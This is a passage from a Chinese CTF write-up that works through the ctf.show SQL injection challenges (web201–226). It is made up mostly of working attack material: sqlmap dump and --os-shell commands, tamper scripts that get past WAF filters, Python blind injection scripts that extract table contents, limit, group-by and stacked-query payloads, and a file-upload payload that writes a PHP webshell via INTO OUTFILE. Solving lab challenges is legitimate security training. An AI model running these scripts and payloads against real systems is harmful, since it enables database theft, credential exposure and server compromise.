--user-agent sqlmap --referer ctf.show --dbs\r爆表\rpython sqlmap.py -u http://6583b09f-115c-4262-8c47-df0a033b1926.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show -D ctfshow_web --tables 爆列\rpython sqlmap.py -u http://6583b09f-115c-4262-8c47-df0a033b1926.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show -D ctfshow_web -T ctfshow_user --columns\r爆值\rpython sqlmap.py -u http://6583b09f-115c-4262-8c47-df0a033b1926.challenge.ctf.show/api/?id= --user-agent sqlmap --referer ctf.show -D ctfshow_web -T ctfshow_user --dump web202 sqlmap最新版下载\r使用--data 调整sqlmap的请求方式 //拼接sql语句查找指定ID用户\r$sql = \"select id,username,password from ctfshow_user where username !='flag' and id = '\".$_GET['id'].\"';\";\r返回逻辑\r//对传入的参数进行了过滤\rfunction waf($str){\r//代码过于简单，不宜展示\r} 通过向命令行加入–data参数转化请求方式为post\nsqlmap -u http://e39cef84-16aa-4167-b5d8-2609318ff7cc.challenge.ctf.show/api/ --data 'id=1' --user-agent sqlmap --referer ctf.show -D ctfshow_web -T ctfshow_user --dump web203 sqlmap最新版下载\r使用--method 调整sqlmap的请求方式 查询语句\r//拼接sql语句查找指定ID用户\r$sql = \"select id,username,password from ctfshow_user where username !='flag' and id = '\".$_GET['id'].\"';\";\r返回逻辑\r//对传入的参数进行了过滤\rfunction waf($str){\r//代码过于简单，不宜展示\r} –headers=“Content-Type: text/plain” 以表单形式发送\nsqlmap -u \"http://29e626b4-75fb-4058-98af-126d2bf725c5.challenge.ctf.show/api/index.php\" --method=\"PUT\" --data=\"id=1\" --referer=ctf.show --headers=\"Content-Type: text/plain\" -D ctfshow_web -T ctfshow_user -C pass --dump web204 使用--cookie 提交cookie数据 payload:\nsqlmap -u \"http://c07422b1-5bde-4baa-9e8c-73ef4edfa83a.challenge.ctf.show/api/index.php\" --method=\"PUT\" --data=\"id=1\" --referer=ctf.show --headers=\"Content-Type: text/plain\" --cookie=\"PHPSESSID:eqf4q2s5ma4u4vtj31sf25lbp5;ctfshow:d5d0917\r6f63d87074e926a342a996872\" -D ctfshow_web -T ctfshow_user -C pass --dump web205 api调用需要鉴权 通过抓包分析，在每次请求url/api/index.php之前需要先请求URL/api/getTokn.php\npayload：\nsqlmap -u \"http://24e98b18-4f9a-4a11-a265-5022e0e3fb05.challenge.ctf.show/api/index.php\" --method=\"PUT\" --data=\"id=1\" --referer=ctf.show --headers=\"Content-Type: text/plain\" --cookie=\"PHPSESSID=60prkqe8189934t5pv3ikepa16\" --safe-url=\"http://24e98b18-4f9a-4a11-a265-5022e0e3fb05.challenge.ctf.show/api/getToken.php\" --safe-freq=1 -D ctfshow_web -T ctfshow_flax --dump web206 sql需要闭合 //拼接sql语句查找指定ID用户\r$sql = \"select id,username,pass from ctfshow_user where id = ('\".$id.\"') limit 0,1;\";\rsqlmap会自动构造闭合，所以跟前一题没什么区别\n但是也可以手动构造一下\npayload:\n根据sql语句，我们采用“)#”的方式进行右闭合。----suffix=\")#\"\r执行sqlmap命令行\rsqlmap -u \"http://aae90b40-e094-482a-bbe1-eabb586a4291.challenge.ctf.show/api/index.php\" --data \"id=1\" --user-agent=sqlmap --referer=ctf.show --method=put --headers=\"Content-Type:text/plain\" --cookie=\"PHPSESSID=sie3k7c33euvbk2s2753f6n0j0;\" --safe-url=\"https://aae90b40-e094-482a-bbe1-eabb586a4291.challenge.ctf.show/api/getToken.php\" --safe-freq=1 --suffix=\")#\" --dbs\rsqlmap -u \"http://00b4cc54-fdc1-4b6a-ada7-bc509824917a.challenge.ctf.show/api/index.php\" --data \"id=1\" --user-agent=sqlmap --referer=ctf.show --method=put --headers=\"Content-Type:text/plain\" --cookie=\"PHPSESSID=lb4lslploh7thdl0hdsd1008f9;\" --safe-url=\"https://00b4cc54-fdc1-4b6a-ada7-bc509824917a.challenge.ctf.show/api/getToken.php\" --safe-freq=1 --suffix=\")#\" -D ctfshow_web --tables\rsqlmap -u http://52acc440-2ed1-4b93-b3af-171d78632ae7.challenge.ctf.show/api/index.php --method=PUT --data=\"id=1\" --referer=ctf.show --dbms=mysql -D \"ctfshow_web\" -T \"ctfshow_flaxc\" -C \"flagv\" --dump --headers=\"Content-Type: text/plain\" --safe-url=http://52acc440-2ed1-4b93-b3af-171d78632ae7.challenge.ctf.show/api/getToken.php --safe-freq=1 web207 Sqlmap Tamper 编写\n示例\n1#!/usr/bin/env python 2 3\"\"\" 4Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/) 5See the file 'doc/COPYING' for copying permission 6\"\"\" 7 8from lib.core.enums import PRIORITY 9__priority__ = PRIORITY.LOW # 当前脚本调用优先等级 10 11def dependencies(): # 声明当前脚本适用/不适用的范围，可以为空。 12 pass 13 14def tamper(payload, **kwargs): # 用于篡改Payload、以及请求头的主要函数 15 return payload 题目\n查询语句\r//拼接sql语句查找指定ID用户\r$sql = \"select id,username,pass from ctfshow_user where id = ('\".$id.\"') limit 0,1;\";\r返回逻辑\r//对传入的参数进行了过滤\rfunction waf($str){\rreturn preg_match('/ /', $str);\r} 这里会将waf中的关键词替换成空格\n放一个Y4tacker大佬的脚本\n1#!/usr/bin/env python 2\"\"\" 3Author:Y4tacker 4\"\"\" 5 6# 假设在Python 3环境中运行，将xrange替换为range 7# 从lib.core.enums模块中导入PRIORITY枚举类型 8from lib.core.enums import PRIORITY 9 10# 设置脚本的优先级为低 11__priority__ = PRIORITY.LOW 12 13def tamper(payload, **kwargs): 14 \"\"\" 15 篡改函数，调用space2comment函数对有效负载进行处理 16 :param payload: 待处理的有效负载 17 :param kwargs: 其他关键字参数 18 :return: 处理后的有效负载 19 \"\"\" 20 payload = space2comment(payload) 21 return payload 22 23def space2comment(payload): 24 \"\"\" 25 将有效负载中的空格字符替换为换行符 26 :param payload: 待处理的有效负载 27 :return: 处理后的有效负载 28 \"\"\" 29 retVal = payload 30 if payload: 31 retVal = \"\" 32 # 用于跟踪是否在单引号内 33 quote = False 34 # 用于跟踪是否在双引号内 35 doublequote = False 36 # 用于跟踪是否遇到第一个空格 37 firstspace = False 38 39 for i in range(len(payload)): 40 if not firstspace: 41 if payload[i].isspace(): 42 firstspace = True 43 retVal += chr(0x0a) 44 continue 45 46 elif payload[i] == '\\'': 47 # 取反quote的值 48 quote = not quote 49 50 elif payload[i] == '\"': 51 # 取反doublequote的值 52 doublequote = not doublequote 53 54 elif payload[i] == \" \" and not doublequote and not quote: 55 retVal += chr(0x0a) 56 continue 57 58 retVal += payload[i] 59 60 return retVal 其实这段代码的目的就是将payload中的空格替换成换行符\n其实直接用sqlmap自带的sapce2comment模板\nsqlmap -u \"http://7bf5dfc3-3078-441f-b245-64dab6933839.challenge.ctf.show/api/index.php\" --method=put --data=\"id=1\" --headers=\"Content-Type: text/plain\" --cookie=\"PHPSESSID=btkhe9vojj5a7piadlc51ubifk;\" --referer=ctf.show -D ctfshow_web --safe-url=\"http://7bf5dfc3-3078-441f-b245-64dab6933839.challenge.ctf.show/api/getToken.php\" --safe-freq=1 --tamper=space2comment -T ctfshow_flaxca --dump web208 同上一题\nsqlmap -u \"http://f287c31a-5cae-478d-af39-de7010c92def.challenge.ctf.show/api/index.php\" --method=put --data=\"id=1\" --headers=\"Content-Type: text/plain\" --cookie=\"PHPSESSID=3e08elobpci83dm5l8mn4hd18k;\" --referer=ctf.show -D ctfshow_web --safe-url=\"http://f287c31a-5cae-478d-af39-de7010c92def.challenge.ctf.show/api/getToken.php\" --safe-freq=1 --tamper=space2comment -T ctfshow_flaxcac --dump web209 这题新增了点waf\n查询语句\r//拼接sql语句查找指定ID用户\r$sql = \"select id,username,pass from ctfshow_user where id = '\".$id.\"' limit 0,1;\";\r返回逻辑\r//对传入的参数进行了过滤\rfunction waf($str){\r//TODO 未完工\rreturn preg_match('/ |\\*|\\=/', $str);\r} Y4tacker大佬的tamper\n1#!/usr/bin/env python 2\"\"\" 3Author:Y4tacker 4\"\"\" 5 6from lib.core.compat import xrange 7from lib.core.enums import PRIORITY 8 9__priority__ = PRIORITY.LOW 10 11 12def tamper(payload, **kwargs): 13 payload = space2comment(payload) 14 return payload 15 16 17def space2comment(payload): 18 retVal = payload 19 if payload: 20 retVal = \"\" 21 quote, doublequote, firstspace = False, False, False 22 23 for i in xrange(len(payload)): 24 if not firstspace: 25 if payload[i].isspace(): 26 firstspace = True 27 retVal += chr(0x0a) 28 continue 29 30 elif payload[i] == '\\'': 31 quote = not quote 32 33 elif payload[i] == '\"': 34 doublequote = not doublequote 35 36 elif payload[i] == \"*\": 37 retVal += chr(0x31) 38 continue 39 40 elif payload[i] == \"=\": 41 retVal += chr(0x0a)+'like'+chr(0x0a) 42 continue 43 44 elif payload[i] == \" \" and not doublequote and not quote: 45 retVal += chr(0x0a) 46 continue 47 48 retVal += payload[i] 49 50 return retVal 其实也不用写这么复杂\n直接这样也ok的\n1#!/usr/bin/env python 2 3from lib.core.enums import PRIORITY 4 5__priority__ = PRIORITY.NORMAL 6 7def dependencies(): 8 pass 9 10 11def tamper(payload, **kwargs): 12 return payload.replace(\"=\", \" like \").replace(\" \", chr(0x09)) payload:\npython sqlmap.py -u \"http://aaa64ad5-5bc1-470b-b485-0549641a1327.challenge.ctf.show/api/index.php\" --method=put --data=\"id=1\" --headers=\"Content-Type: text/plain\" --cookie=\"PHPSESSID=3oemcboib377tes0fi7ltgh9ba;\" --referer=ctf.show -D ctfshow_web --safe-url=\"http://aaa64ad5-5bc1-470b-b485-0549641a1327.challenge.ctf.show/api/getToken.php\" --safe-freq=1 --tamper=web209 -T ctfshow_flav --dump web210 查询语句\r//拼接sql语句查找指定ID用户\r$sql = \"select id,username,pass from ctfshow_user where id = '\".$id.\"' limit 0,1;\";\r返回逻辑\r//对查询字符进行解密\rfunction decode($id){\rreturn strrev(base64_decode(strrev(base64_decode($id))));\r}\r这题会对查询的字符进行两次的base64解密和两次的反转\n那我们只需要修改tamper，使传入的payload进行两次base64加密即可\n1#!/usr/bin/env python 2 3from lib.core.enums import PRIORITY 4import base64 5 6__priority__ = PRIORITY.NORMAL 7 8def dependencies(): 9 pass 10 11 12def tamper(payload, **kwargs): 13 rev1 = payload[::-1].encode() 14 encode1 = base64.b64encode(rev1).decode() 15 rev2 = encode1[::-1].encode() 16 encode2 = base64.b64encode(rev2).decode() 17 return encode2 payload:\npython sqlmap.py -u \"http://35600981-0e61-43e6-85ce-38d9cc6eeaf5.challenge.ctf.show/api/index.php\" --method=put --data=\"id=1\" --headers=\"Content-Type: text/plain\" --cookie=\"PHPSESSID=bffum6tr2u1k3h8l9bgtkst4ni;\" --referer=ctf.show -D ctfshow_web --safe-url=\"http://35600981-0e61-43e6-85ce-38d9cc6eeaf5.challenge.ctf.show/api/getToken.php\" --safe-freq=1 --tamper=web210 -T ctfshow_flavi --dump web211 查询语句\r//拼接sql语句查找指定ID用户\r$sql = \"select id,username,pass from ctfshow_user where id = '\".$id.\"' limit 0,1;\";\r返回逻辑\r//对查询字符进行解密\rfunction decode($id){\rreturn strrev(base64_decode(strrev(base64_decode($id))));\r}\rfunction waf($str){\rreturn preg_match('/ /', $str);\r} 增加了空格waf\n问题不大\n1#!/usr/bin/env python 2 3from lib.core.enums import PRIORITY 4import base64 5 6__priority__ = PRIORITY.NORMAL 7 8def dependencies(): 9 pass 10 11 12def tamper(payload, **kwargs): 13\t14 payload0 = payload.replace(\" \", chr(0x09)) 15 rev1 = payload0[::-1].encode() 16 encode1 = base64.b64encode(rev1).decode() 17 rev2 = encode1[::-1].encode() 18 encode2 = base64.b64encode(rev2).decode() 19 return encode2 payload\npython sqlmap.py -u \"http://f9c9297a-3dc9-496e-8d15-33e170db0df8.challenge.ctf.show/api/index.php\" --method=put --data=\"id=1\" --headers=\"Content-Type: text/plain\" --cookie=\"PHPSESSID=ibn3o3imhq85l1043f80nbdova;\" --referer=ctf.show -D ctfshow_web --safe-url=\"http://f9c9297a-3dc9-496e-8d15-33e170db0df8.challenge.ctf.show/api/getToken.php\" --safe-freq=1 --tamper=web211 -T ctfshow_flavia --dump web212 1查询语句 2 3//拼接sql语句查找指定ID用户 4$sql = \"select id,username,pass from ctfshow_user where id = '\".$id.\"' limit 0,1;\"; 5 6返回逻辑 7 8//对查询字符进行解密 9 function decode($id){ 10 return strrev(base64_decode(strrev(base64_decode($id)))); 11 } 12function waf($str){ 13 return preg_match('/ |\\*/', $str); 14} waf增加了*\n但是不影响上一题的tamper\npython sqlmap.py -u \"http://2055229c-7666-493e-9329-2cdc56d820ed.challenge.ctf.show/api/index.php\" --method=put --data=\"id=1\" --headers=\"Content-Type: text/plain\" --cookie=\"PHPSESSID=72duisds4cprdqlbtf4fu4389d;\" --referer=ctf.show -D ctfshow_web --safe-url=\"http://2055229c-7666-493e-9329-2cdc56d820ed.challenge.ctf.show/api/getToken.php\" --safe-freq=1 --tamper=web211 -T ctfshow_flavis --dump web213 1查询语句 2 3//拼接sql语句查找指定ID用户 4$sql = \"select id,username,pass from ctfshow_user where id = '\".$id.\"' limit 0,1;\"; 5 6返回逻辑 7 8//对查询字符进行解密 9 function decode($id){ 10 return strrev(base64_decode(strrev(base64_decode($id)))); 11 } 12function waf($str){ 13 return preg_match('/ |\\*/', $str); 14} 根据提示，用–os-shell拿到shell读flag\n其他跟上题一样\npayload:\npython sqlmap.py -u \"http://341989d1-8945-4c5d-b70e-2d69a0f850b1.challenge.ctf.show/api/index.php\" --method=put --data=\"id=1\" --headers=\"Content-Type: text/plain\" --cookie=\"PHPSESSID=66ddslui3ejn3b4pa6437qm60j;\" --referer=ctf.show --safe-url=\"http://341989d1-8945-4c5d-b70e-2d69a0f850b1.challenge.ctf.show/api/getToken.php\" --safe-freq=1 --tamper=web211 --os-shell 时间盲注 web214 这道题没给出注入点\n主页找到select.js中，测试后发现ip为注入点\n1import requests 2 3url = \"http://fe78d582-57da-4291-845f-1e8ff2936104.challenge.ctf.show/api/\" 4result = \"\" 5i = 0 6 7while True: 8 i = i + 1 9 # ASCII码范围，32到127是可打印字符的范围 10 head = 32 11 tail = 127 12 13 while head \u003c tail: 14 # 二分查找的中间值 15 mid = (head + tail) \u003e\u003e 1 16\t# 查表名 17 # payload = \"select group_concat(table_name) from information_schema.tables where table_schema=database()\" 18 # 查列名 19 # payload = \"select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagx'\" 20 # 爆字段 21 payload = \"select flaga from ctfshow_flagx\" 22 data = { 23 'ip': f\"if(ascii(substr(({payload}),{i},1))\u003e{mid},sleep(1),1)\", 24 'debug': '0' 25 } 26 try: 27 # 发送POST请求，设置超时时间为1秒 28 r = requests.post(url, data=data, timeout=1) 29 # 如果请求在1秒内返回，说明当前位置字符的ASCII码小于等于中间值 30 tail = mid 31 except requests.exceptions.Timeout: 32 # 如果请求超时，说明当前位置字符的ASCII码大于中间值 33 head = mid + 1 34 except Exception as e: 35 print(f\"An unexpected error occurred: {e}\") 36 break 37 38 if head != 32: 39 # 如果找到有效的字符，将其添加到结果字符串中 40 result += chr(head) 41 else: 42 # 如果没有找到有效字符，退出循环 43 break 44 print(\"[*]Result : \"+result) web215 上题脚本改一改\n1import requests 2 3url = \"http://08e16d35-1a8c-4ed7-9e9e-760a32aa0756.challenge.ctf.show/api/\" 4result = \"\" 5i = 0 6 7while True: 8 i = i + 1 9 # ASCII码范围，32到127是可打印字符的范围 10 head = 32 11 tail = 127 12 13 while head \u003c tail: 14 # 二分查找的中间值 15 mid = (head + tail) \u003e\u003e 1 16\t# 查表名 17 payload = \"select group_concat(table_name) from information_schema.tables where table_schema=database()\" 18 # 查列名 19 # payload = \"select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagx'\" 20 # 爆字段 21 # payload = \"select flaga from ctfshow_flagx\" 22 data = { 23 'ip': f\"1' or if(ascii(substr(({payload}),{i},1))\u003e{mid},sleep(1),1)#\", 24 'debug': '0' 25 } 26 try: 27 # 发送POST请求，设置超时时间为1秒 28 r = requests.post(url, data=data, timeout=1) 29 # 如果请求在1秒内返回，说明当前位置字符的ASCII码小于等于中间值 30 tail = mid 31 except requests.exceptions.Timeout: 32 # 如果请求超时，说明当前位置字符的ASCII码大于中间值 33 head = mid + 1 34 except Exception as e: 35 print(f\"An unexpected error occurred: {e}\") 36 break 37 38 if head != 32: 39 # 如果找到有效的字符，将其添加到结果字符串中 40 result += chr(head) 41 else: 42 # 如果没有找到有效字符，退出循环 43 break 44 print(\"[*]Result : \"+result) web216 构造闭合即可\n1import requests 2 3url = \"http://d3d3aa4e-87f5-454c-b589-826971f59bbb.challenge.ctf.show/api/\" 4result = \"\" 5i = 0 6 7while True: 8 i = i + 1 9 # ASCII码范围，32到127是可打印字符的范围 10 head = 32 11 tail = 127 12 13 while head \u003c tail: 14 # 二分查找的中间值 15 mid = (head + tail) \u003e\u003e 1 16\t# 查表名 17 # payload = \"select group_concat(table_name) from information_schema.tables where table_schema=database()\" 18 # 查列名 19 # payload = \"select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxcc'\" 20 # 爆字段 21 payload = \"select flagaac from ctfshow_flagxcc\" 22 data = { 23 'ip': f\"'') or if(ascii(substr(({payload}),{i},1))\u003e{mid},sleep(1),1)#\", 24 'debug': '0' 25 } 26 try: 27 # 发送POST请求，设置超时时间为1秒 28 r = requests.post(url, data=data, timeout=1) 29 # 如果请求在1秒内返回，说明当前位置字符的ASCII码小于等于中间值 30 tail = mid 31 except requests.exceptions.Timeout: 32 # 如果请求超时，说明当前位置字符的ASCII码大于中间值 33 head = mid + 1 34 except Exception as e: 35 print(f\"An unexpected error occurred: {e}\") 36 break 37 38 if head != 32: 39 # 如果找到有效的字符，将其添加到结果字符串中 40 result += chr(head) 41 else: 42 # 如果没有找到有效字符，退出循环 43 break 44 print(\"[*]Result : \"+result) web217 这题waf了sleep\n可以改用benchmark\n在 MySQL 中，benchmark函数用于测试表达式执行的性能。它的语法是benchmark(count,expr)，其中count是要执行expr的次数，expr是要测试的表达式。 例如，benchmark(10000000,sha(1))表示将sha(1)这个表达式执行 10000000 次。sha(1)是计算字符串'1'的 SHA - 1 哈希值。 1import requests 2import time 3 4url = \"http://b5d4a386-1612-4c40-b14c-e9103a54188c.challenge.ctf.show/api/\" 5result = \"\" 6i = 0 7 8while True: 9 i = i + 1 10 # ASCII码范围，32到127是可打印字符的范围 11 head = 32 12 tail = 127 13 14 while head \u003c tail: 15 # 二分查找的中间值 16 mid = (head + tail) \u003e\u003e 1 17 # 查数据库 18 # payload = \"select group_concat(table_name) from information_schema.tables where table_schema=database()\" 19 # 查列名字 20 # payload = \"select column_name from information_schema.columns where table_name='ctfshow_flagxccb' limit 1,1\" 21 # 查数据 22 payload = \"select flagaabc from ctfshow_flagxccb\" 23 data = { 24 'ip': f\"1) or if(ascii(substr(({payload}),{i},1))\u003e{mid},benchmark(1000000,sha(1)),1)#\", 25 'debug': '0' 26 } 27 try: 28 # 发送POST请求，设置超时时间为1秒 29 r = requests.post(url, data=data, timeout=0.33) 30 # 如果请求在1秒内返回，说明当前位置字符的ASCII码小于等于中间值 31 time.sleep(1) 32 tail = mid 33 except requests.exceptions.Timeout: 34 # 如果请求超时，说明当前位置字符的ASCII码大于中间值 35 time.sleep(1) 36 head = mid + 1 37 except Exception as e: 38 time.sleep(1) 39 print(f\"An unexpected error occurred: {e}\") 40 break 41 42 if head != 32: 43 # 如果找到有效的字符，将其添加到结果字符串中 44 result += chr(head) 45 else: 46 # 如果没有找到有效字符，退出循环 47 break 48 49 print(\"[*]Result : \"+result) benchmark的设置比较苛刻，要多试试\n最好不要设置太大，环境会崩\nweb218 1查询语句 2 3 where id = ($id); 4 5返回逻辑 6 7 //屏蔽危险分子 8 function waf($str){ 9 return preg_match('/sleep|benchmark/i',$str); 10 } 11 这题sleep和benchmark都被ban掉了\n可以考虑用笛卡尔积盲注\n参考文章：SQL注入经验-大负荷注入-腾讯云开发者社区-腾讯云\n1import requests 2import time 3 4url = \"http://a17ea2c9-7463-4d5a-bfa5-2f6bdcd2daf1.challenge.ctf.show/api/\" 5result = \"\" 6i = 0 7 8while True: 9 i = i + 1 10 # ASCII码范围，32到127是可打印字符的范围 11 head = 32 12 tail = 127 13 14 while head \u003c tail: 15 # 二分查找的中间值 16 mid = (head + tail) \u003e\u003e 1 17 18 # payload = \"select table_name from information_schema.tables where table_schema=database() limit 0,1\" 19 # payload = \"select column_name from information_schema.columns where table_name='ctfshow_flagxc' limit 1,1\" 20 payload = \"select flagaac from ctfshow_flagxc\" 21 data = { 22 'ip': f\"1) or if(ascii(substr(({payload}),{i},1))\u003e{mid},(select count(*) from information_schema.columns A, information_schema.columns B),1)#\", 23 'debug': '1' 24 } 25 try: 26 # 发送POST请求，设置超时时间为1秒 27 r = requests.post(url, data=data, timeout=0.15) 28 # 如果请求在1秒内返回，说明当前位置字符的ASCII码小于等于中间值 29 time.sleep(0.2) 30 tail = mid 31 except requests.exceptions.Timeout: 32 # 如果请求超时，说明当前位置字符的ASCII码大于中间值 33 time.sleep(0.2) 34 head = mid + 1 35 except Exception as e: 36 time.sleep(0.2) 37 print(f\"An unexpected error occurred: {e}\") 38 break 39 40 if head != 32: 41 # 如果找到有效的字符，将其添加到结果字符串中 42 result += chr(head) 43 else: 44 # 如果没有找到有效字符，退出循环 45 break 46 47 print(\"[*]Result : \"+result) 48 49# ctfshow{d317911f-ac1e-4160-be70-47d01a0f2f45} 乱码的话，多跑几次就好了\n另一种方法就是通过正则 DOS RLIKE注入\n利用 SQL 多次计算正则消耗计算资源产生延时效果，与 benchmark 原理类似，通过 rpad 或 repeat 构造长字符串，以计算量大的 pattern。\ndebug=1\u0026ip=repeat(rpad('a', 999999, 'a'),16) rlike concat(repeat('(a.*)+',14), 'b') web219 查询语句\rwhere id = ($id);\r返回逻辑\r//屏蔽危险分子\rfunction waf($str){\rreturn preg_match('/sleep|benchmark|rlike/i',$str);\r} 继续使用笛卡尔积盲注即可\n1import requests 2import time 3 4url = \"http://61d55d79-847e-43d7-80e4-c221ceae9f4a.challenge.ctf.show/api/\" 5result = \"\" 6i = 0 7 8while True: 9 i = i + 1 10 # ASCII码范围，32到127是可打印字符的范围 11 head = 32 12 tail = 127 13 14 while head \u003c tail: 15 # 二分查找的中间值 16 mid = (head + tail) \u003e\u003e 1 17 18 # payload = \"select table_name from information_schema.tables where table_schema=database() limit 0,1\" 19 # payload = \"select column_name from information_schema.columns where table_name='ctfshow_flagxca' limit 1,1\" 20 payload = \"select flagaabc from ctfshow_flagxca\" 21 22 data = { 23 'ip': f\"1) or if(ascii(substr(({payload}),{i},1))\u003e{mid},(select count(*) from information_schema.columns A, information_schema.columns B),1)#\", 24 'debug': '1' 25 } 26 try: 27 # 发送POST请求，设置超时时间为1秒 28 r = requests.post(url, data=data, timeout=0.15) 29 # 如果请求在1秒内返回，说明当前位置字符的ASCII码小于等于中间值 30 time.sleep(0.2) 31 tail = mid 32 except requests.exceptions.Timeout: 33 # 如果请求超时，说明当前位置字符的ASCII码大于中间值 34 time.sleep(0.2) 35 head = mid + 1 36 except Exception as e: 37 time.sleep(0.2) 38 print(f\"An unexpected error occurred: {e}\") 39 break 40 41 if head != 32: 42 # 如果找到有效的字符，将其添加到结果字符串中 43 result += chr(head) 44 else: 45 # 如果没有找到有效字符，退出循环 46 break 47 48 print(\"[*]Result : \"+result) web220 查询语句\rwhere id = ($id);\r返回逻辑\r//屏蔽危险分子\rfunction waf($str){\rreturn preg_match('/sleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr/i',$str);\r} substr用left代替即可，有点像之前布尔盲注的一道题，只是改成了时间盲注罢了\n1import requests 2import string 3import time 4 5url = \"http://52728b9a-ffae-4f96-b51f-0549bb5cb4e0.challenge.ctf.show/api/\" 6str=\" _{}-\" + string.ascii_lowercase + string.digits 7result = '' 8for i in range(1,45): 9 for j in str: 10 # payload = \"select table_name from information_schema.tables where table_schema=database() limit 0,1\" 11 # payload = \"select column_name from information_schema.columns where table_name='ctfshow_flagxcac' limit 1,1\" 12 payload = \"select flagaabcc from ctfshow_flagxcac\" 13 14 data = { 15 'ip': f\"1) or if(LEFT(({payload}),{i})regexp('{result+j}'),(select count(*) from information_schema.columns A, information_schema.columns B),1)#\", 16 'debug': 0 17 } 18 try: 19 r = requests.post(url, data=data, timeout=0.15) 20 time.sleep(0.2) 21 except Exception as e: 22 time.sleep(0.2) 23 result = result + j 24 print(\"[*] loading :\"+result) 25 break 26 27print(\"[*] result :\"+result) web221 1查询语句 2 3 //分页查询 4 $sql = select * from ctfshow_user limit ($page-1)*$limit,$limit; 5 6返回逻辑 7 8//TODO:很安全，不需要过滤 9//拿到数据库名字就算你赢 p神的文章有提到limit注入\n[转载]Mysql下Limit注入方法 | 离别歌\npayload:\n?page=1\u0026limit=1%20procedure%20analyse(extractvalue(rand(),concat(0x3a,database())),1) group注入 web222 查询语句\r//分页查询\r$sql = select * from ctfshow_user group by $username;\r返回逻辑\r//TODO:很安全，不需要过滤 group by 可以进行时间盲注，布尔盲注等\n本来以为是报错注入的，发现好像不太行\n还是的时间盲注\n拿前面的盲注脚本改一改\n1import requests 2import time 3url = \"http://529d9311-c036-4831-bfa1-b2ca91dae190.challenge.ctf.show/api/?u=\" 4result = \"\" 5i = 0 6 7while True: 8 i = i + 1 9 # ASCII码范围，32到127是可打印字符的范围 10 head = 32 11 tail = 127 12 13 while head \u003c tail: 14 # 二分查找的中间值 15 mid = (head + tail) \u003e\u003e 1 16 # 查表名 17 # payload = \"select group_concat(table_name) from information_schema.tables where table_schema=database()\" 18 # 查列名字 19 # payload = \"select column_name from information_schema.columns where table_name='ctfshow_flaga' limit 1,1\" 20 # 爆字段 21 payload = \"select flagaabc from ctfshow_flaga\" 22 23 data = f\"concat((if (ascii(substr(({payload}),{i},1))\u003e{mid}, sleep(0.05), 2)), 1);\" 24 25 try: 26 r = requests.post(url+data, timeout=0.05) 27 time.sleep(0.2) 28 tail = mid 29 except requests.exceptions.Timeout: 30 time.sleep(0.2) 31 # 如果请求超时，说明当前位置字符的ASCII码大于中间值 32 head = mid + 1 33 except Exception as e: 34 time.sleep(0.2) 35 print(f\"An unexpected error occurred: {e}\") 36 break 37 38 if head != 32: 39 # 如果找到有效的字符，将其添加到结果字符串中 40 result += chr(head) 41 else: 42 # 如果没有找到有效字符，退出循环 43 break 44 print(\"[*]Result : \"+result) web223 1查询语句 2 3 //分页查询 4 $sql = select * from ctfshow_user group by $username; 5 6返回逻辑 7 8//TODO:很安全，不需要过滤 9//用户名不能是数字 这题ban掉了数字\n用true来构造出数字即可\n这题一开始我想用时间盲注的，但是跑不出来，后面直接拿y4✌的布尔盲注跑了\n如下\n1import requests 2import time 3url = \"http://14dc1900-f046-44e8-bfa2-e93fbc2a32b3.challenge.ctf.show/api/?u=\" 4result = \"\" 5i = 0 6 7def createNum(n): 8 num = 'true' 9 if n == 1: 10 return 'true' 11 else: 12 for i in range(n - 1): 13 num += \"+true\" 14 return num 15 16while True: 17 i = i + 1 18 # ASCII码范围，32到127是可打印字符的范围 19 head = 32 20 tail = 127 21 22 while head \u003c tail: 23 # 二分查找的中间值 24 mid = (head + tail) \u003e\u003e 1 25 26 # 查数据库-ctfshow_flagas 27 # payload = \"select group_concat(table_name) from information_schema.tables where table_schema=database()\" 28 # 查字段-flagasabc 29 # payload = \"select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagas'\" 30 # 查flag 31 payload = \"select flagasabc from ctfshow_flagas\" 32 33 34 params = { 35 # \"u\": f\"if(ascii(substr(({payload}),{createNum(i)},{createNum(1)}))\u003e{createNum(mid)},sleep(true),true)\" #时间盲注 （我没跑出来，不知道为啥 36 \"u\": f\"if(ascii(substr(({payload}),{createNum(i)},{createNum(1)}))\u003e{createNum(mid)},username,'a')\" #布尔盲注 37 } 38 39 # try: 40 # r = requests.post(url,params=params,timeout=1) 41 # tail = mid 42 # except Exception as e: 43 # head = mid + 1 44 45 r = requests.get(url, params=params) 46 if \"userAUTO\" in r.text: 47 head = mid + 1 48 else: 49 tail = mid 50 51 if head != 32: 52 # 如果找到有效的字符，将其添加到结果字符串中 53 result += chr(head) 54 else: 55 # 如果没有找到有效字符，退出循环 56 break 57 58 print(result) 布尔盲注这么快，我为什么要想不开尝试时间盲注呢\nweb224 试了试万能密码，失败了\n访问/robots.txt\n发现有重置密码的路由\n修改密码之后登入，看到一个文件上传\nctfshow web224 sql_文件上传产生sql注入 详解_sql注入漏洞ctf文件上传-CSDN博客\n这是一道文件上传的sql注入题\n当文件上传时，后台会将文件名，文件路径，文件类型（文件头）直接与sql语句进行拼接\n所以我们可以构造一个恶意文件，将文件头改写成我们要拼接的sql语句，从而实现注入\n如图\npayload:\nC64File \"');select 0x3c3f3d60746163202f662a603f3e into outfile '/var/www/html/1.php';--+ 新建文本，写入payload，改名为1.bin，上传文件，访问1.bin拿到flag\n堆叠注入 web225 没有过滤show\nusername=1';show tables; 可以用handler读\npayload:\nusername=ctfshow';show tables;handler ctfshow_flagasa open;handler ctfshow_flagasa read first; 1.handler ctfshow_flag as a open;\nHANDLER 语句是 MySQL 中用于直接操作表的一种特殊方式。此语句的作用是打开一个名为 ctfshow_flag 的表，并将其别名为 a。HANDLER 语句可以绕过一些常规的查询机制，直接访问表的数据，通常用于高效地获取数据。\n2.handler ctfshow_flag as a read first;\n该语句继续使用 HANDLER 来操作之前打开的 ctfshow_flag 表（别名 a），read first 表示读取表中的第一行数据。\n其他方法\nweb226 1查询语句 2 3 //分页查询 4 $sql = \"select id,username,pass from ctfshow_user where username = '{$username}';\"; 5 6返回逻辑 7 8 //师傅说过滤的越多越好 9 if(preg_match('/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|\\(/i',$username)){ 10 